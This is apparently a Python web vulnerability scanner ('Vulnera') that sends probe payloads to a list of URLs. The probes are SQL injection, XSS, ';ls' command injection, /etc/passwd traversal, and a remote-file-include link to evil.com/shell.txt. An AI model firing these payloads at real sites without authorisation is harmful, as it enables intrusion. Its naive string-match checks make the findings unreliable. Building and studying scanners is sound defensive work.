import os
import json
import time
import requests
from termcolor import colored

def print_logo():
    logo = r"""
██    ██ ██    ██ ██      ███    ██ ███████ ██████   █████  
██    ██ ██    ██ ██      ████   ██ ██      ██   ██ ██   ██ 
██    ██ ██    ██ ██      ██ ██  ██ █████   ██████  ███████ 
 ██  ██  ██    ██ ██      ██  ██ ██ ██      ██   ██ ██   ██ 
  ████    ██████  ███████ ██   ████ ███████ ██   ██ ██   ██ 
"""
    print(colored(logo, 'red'))
    print(colored( "Vulnera - Web Vulnerability Scanner\n", 'cyan'))
    print(colored(" Tool By Kp3 @kemo_py3\n", 'cyan'))
    print(colored("Color Guide: GREEN = Safe | YELLOW = Warning | RED = Vulnerable", 'yellow'))
    print()

def scan_sql_injection(url):
    payload = "' OR '1'='1"
    test_url = url + payload
    try:
        response = requests.get(test_url, timeout=5)
        time.sleep(1)
        if "sql" in response.text.lower() or "syntax" in response.text.lower():
            return {"status": "vulnerable", "recommendation": "Use parameterized queries or ORM."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_xss(url):
    payload = "<script>alert(1)</script>"
    test_url = url + payload
    try:
        response = requests.get(test_url, timeout=5)
        time.sleep(1)
        if payload in response.text:
            return {"status": "vulnerable", "recommendation": "Sanitize inputs and use CSP."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_clickjacking(url):
    try:
        response = requests.get(url, timeout=5)
        time.sleep(1)
        if "X-Frame-Options" not in response.headers:
            return {"status": "vulnerable", "recommendation": "Add X-Frame-Options header."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_headers(url):
    try:
        response = requests.get(url, timeout=5)
        time.sleep(1)
        missing = []
        for header in ["X-Content-Type-Options", "X-XSS-Protection", "Content-Security-Policy"]:
            if header not in response.headers:
                missing.append(header)
        if missing:
            return {"status": "warning", "recommendation": f"Add headers: {', '.join(missing)}"}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_directory_listing(url):
    try:
        response = requests.get(url, timeout=5)
        time.sleep(1)
        if "Index of /" in response.text:
            return {"status": "vulnerable", "recommendation": "Disable directory listing on server."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_command_injection(url):
    payload = ";ls"
    test_url = url + payload
    try:
        response = requests.get(test_url, timeout=5)
        time.sleep(1)
        if "bin" in response.text or "root" in response.text:
            return {"status": "vulnerable", "recommendation": "Validate and sanitize system command input."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_lfi(url):
    payload = "../../../../etc/passwd"
    test_url = url + payload
    try:
        response = requests.get(test_url, timeout=5)
        time.sleep(1)
        if "root:" in response.text:
            return {"status": "vulnerable", "recommendation": "Validate file path inputs and use allowlist."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_rfi(url):
    payload = "http://evil.com/shell.txt"
    test_url = url + payload
    try:
        response = requests.get(test_url, timeout=5)
        time.sleep(1)
        if "shell" in response.text.lower():
            return {"status": "vulnerable", "recommendation": "Disable remote file includes and validate URLs."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_open_redirect(url):
    payload = "?next=http://evil.com"
    test_url = url + payload
    try:
        response = requests.get(test_url, allow_redirects=False, timeout=5)
        time.sleep(1)
        if response.status_code in [301, 302] and "evil.com" in response.headers.get("Location", ""):
            return {"status": "vulnerable", "recommendation": "Validate redirect URLs and use allowlist."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_csrf(url):
    try:
        response = requests.get(url, timeout=5)
        time.sleep(1)
        if "csrf" not in response.text.lower():
            return {"status": "warning", "recommendation": "Implement CSRF tokens in forms."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_dir_traversal(url):
    payload = "../../etc/passwd"
    test_url = url + payload
    try:
        response = requests.get(test_url, timeout=5)
        time.sleep(1)
        if "root:" in response.text:
            return {"status": "vulnerable", "recommendation": "Filter special characters in file paths."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_host_header(url):
    try:
        response = requests.get(url, headers={"Host": "evil.com"}, timeout=5)
        time.sleep(1)
        if "evil.com" in response.text:
            return {"status": "vulnerable", "recommendation": "Validate host headers on server."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_method_support(url):
    try:
        response = requests.options(url, timeout=5)
        time.sleep(1)
        if "PUT" in response.headers.get("Allow", ""):
            return {"status": "warning", "recommendation": "Disable unsafe HTTP methods like PUT/DELETE."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_sensitive_info(url):
    try:
        response = requests.get(url, timeout=5)
        time.sleep(1)
        if "password" in response.text.lower() or "apikey" in response.text.lower():
            return {"status": "warning", "recommendation": "Avoid exposing sensitive info in response."}
        return {"status": "safe"}
    except:
        return {"status": "error"}

def scan_http_vs_https(url):
    if url.startswith("http://"):
        time.sleep(1)
        return {"status": "warning", "recommendation": "Use HTTPS to secure traffic."}
    return {"status": "safe"}

scan_functions = [
    ("SQL Injection", scan_sql_injection),
    ("Cross Site Scripting (XSS)", scan_xss),
    ("Clickjacking", scan_clickjacking),
    ("Security Headers", scan_headers),
    ("Directory Listing", scan_directory_listing),
    ("Command Injection", scan_command_injection),
    ("Local File Inclusion", scan_lfi),
    ("Remote File Inclusion", scan_rfi),
    ("Open Redirect", scan_open_redirect),
    ("CSRF", scan_csrf),
    ("Directory Traversal", scan_dir_traversal),
    ("Host Header Injection", scan_host_header),
    ("HTTP Method Support", scan_method_support),
    ("Sensitive Info Exposure", scan_sensitive_info),
    ("HTTP vs HTTPS", scan_http_vs_https)
]

def color_status(status):
    if status == "vulnerable":
        return colored("VULNERABLE", "red")
    elif status == "warning":
        return colored("WARNING", "yellow")
    elif status == "safe":
        return colored("SAFE", "green")
    else:
        return colored("ERROR", "magenta")

def main():
    print_logo()
    for i, (name, _) in enumerate(scan_functions, 1):
        print(colored(f"{i} - {name}", 'green'))
    print(colored("0 - Scan All", 'red'))

    choice = input(colored("Enter your choice (0-15): ", 'yellow'))
    file_name = input("Enter the filename containing the URLs (e.g. urls.txt): ")

    if not os.path.isfile(file_name):
        print(colored("File not found!", 'red'))
        return

    with open(file_name, 'r') as file:
        urls = [u.strip() for u in file.readlines()]

    results = {}
    for url in urls:
        print(colored(f"\nScanning {url}", 'cyan'))
        results[url] = {}
        selected_scans = scan_functions if choice == "0" else [scan_functions[int(choice) - 1]]
        for name, func in selected_scans:
            result = func(url)
            results[url][name] = result
            print(f"  {name}: {color_status(result['status'])}")
            if 'recommendation' in result:
                print(colored(f"    → {result['recommendation']}", 'yellow'))

    os.makedirs("reports", exist_ok=True)
    with open("reports/scan_report.json", "w") as f:
        json.dump(results, f, indent=4)
    print(colored("\n[+] Report saved to reports/scan_report.json", 'green'))

if __name__ == "__main__":
    main()